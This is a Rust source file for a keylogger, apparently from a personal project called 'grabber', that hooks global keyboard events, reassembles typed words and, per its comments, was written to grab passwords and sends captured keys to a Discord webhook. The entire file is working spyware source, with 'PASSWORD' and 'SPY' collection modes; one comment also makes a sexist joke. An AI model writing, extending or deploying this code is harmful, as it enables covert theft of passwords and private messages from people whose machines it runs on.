use keylogger::*;
use rdev::{EventType, Key};
use std::{sync::mpsc, time::Instant};

fn main() -> Result<(), Box<rdev::ListenError>> {
    println!("MAKE SURE TO DELETE THE WEBHOOK BEFORE COMITTING.");
    read_from_url();
    let mut sentence = String::new(); // We add words to this once Space is pressed.
    let mut current_word_buf: Vec<String> = Vec::new(); // This is equivalent to a Python list.
    let mut cursor_pos = 0; // Keeps track of the cursor position, and cannot be negative.

    let (tx, rx) = mpsc::channel::<Instant>(); 
    /* So, when the control/windows keys are pressed, for Rust reasons, I had
       to send messages across threads, this was awkward but it meant that the keylogger
       handles shortcuts (like ctrl + backspace) the same on Windows and Linux
       
       The below mod_send, mod_recv are simiilar, they handle windows keys etc.
       See the top of lib.rs for the list of MODIFIER_KEYS, I will use later.
    */
    
    // By the way, don't worry if you don't get any of this, 
    // I'll try to explain it else it doesn't really matter
    
    let (mod_send, mod_recv) = mpsc::channel::<Instant>();

    rdev::listen(move |event| {
        // These are true or false if the ctrl or alt, windows key etc are held
        // This means any character typed for a keyboard shortcut will not be logged.
        let ctrl_held = timer_done(&rx, TIMEOUT);
        let modkey_held = timer_done(&mod_recv, TIMEOUT);

        if let EventType::KeyPress(key) = event.event_type {
            if MODIFIER_KEYS.contains(&key) {
                // See lib.rs for this function, it starts a 5ms timer where any new keys pressed are ignored
                start_timer(mod_send.clone()).unwrap();
            } else {
                match key {
                    Key::ControlLeft | Key::ControlRight => {
                        // See lib.rs for this function, it starts a 5ms timer where any new keys pressed are ignored
                        start_timer(tx.clone()).unwrap(); 
                    }
                    Key::Return => {
                        // This was written to grab passwords, it needs a lot of work doing however.
                        // Basically ignores short words, but this might be a bugs as my program has two modes,
                        // PASSWORD and SPY mode, where SPY mode collects whole sentences.
                        if current_word_buf.len() >= 5 {
                            match current_word_buf.append_to_log() {
                                Ok(_) => (),
                                Err(err) => {
                                    eprintln!("{}", err);
                                },
                            }
                            current_word_buf.clear();
                            cursor_pos = 0;
                        } else {
                            current_word_buf.clear();
                            cursor_pos = 0;
                        }
                    }
                    Key::Space => {
                        if !GET_SENTENCES { // This checks for `SPY` mode.
                            sentence.push_str( // It adds the word in the current_word_buf to the sentence `list`
                                &current_word_buf 
                                    .iter()
                                    .map(|s| s.clone())
                                    .collect::<String>(),
                            );
                            current_word_buf.clear(); // And clears the the word buf
                            cursor_pos = 0; // Resets the cursor position
                        } else { 
                            // This is if we wanna grab passwords.
                            handle_key( // Se lib.rs for this function: https://github.com/nullndvoid/grabber/
                                Some(" ".to_string()), 
                                ctrl_held,
                                modkey_held,
                                &mut cursor_pos,
                                &mut current_word_buf,
                            );
                        }
                    }
                    Key::RightArrow => {
                        if cursor_pos < current_word_buf.len() {
                            cursor_pos += 1;
                        }                                      // Luckily a lot of these are simple, just handling simple things here.
                    }
                    Key::LeftArrow => {                         // We don't want the cursor pos to go out of bounds.
                        if ctrl_held && cursor_pos >= 1 {
                            cursor_pos = 0;
                        } else if cursor_pos >= 1 {
                            cursor_pos -= 1;
                        }
                    }
                    Key::UpArrow => {
                        current_word_buf.clear(); // This clears because I wasn't sure how to handle it if someone pressed these.
                        cursor_pos = 0;           // They might, for example, be a woman.
                    }

                    Key::DownArrow => {
                        current_word_buf.clear();
                        cursor_pos = 0;
                    }
                    Key::Delete => {}
                    Key::Backspace => {
                        if ctrl_held { // Clear whole word
                            current_word_buf.drain(0..cursor_pos);
                            cursor_pos = 0;
                        } else if !current_word_buf.is_empty() // Otherwise clear the character before it.
                            && current_word_buf.get(cursor_pos) != Some(&current_word_buf[0]) 
                        // These three checks are so the program doesn't crash
                            && cursor_pos >= 1
                        {
                            current_word_buf.remove(cursor_pos - 1); 
                            cursor_pos -= 1;
                        }
                    }

                    _ => { // So this is where normal keys go.
                        let event = event.name;
                        handle_key( // My code in lib.rs sends them to a discord webhook, because that is EZ and I'm lazy.
                            event, // The key
                            ctrl_held, 
                            modkey_held,
                            &mut cursor_pos, // &mut is the rust way of saying, "I would like to change your value you pass in."
                            &mut current_word_buf, // Same thing here.
                        )
                    }
                }
            }
        }
    })?;

    Ok(()) // Ignore, this is a rust thing...
}
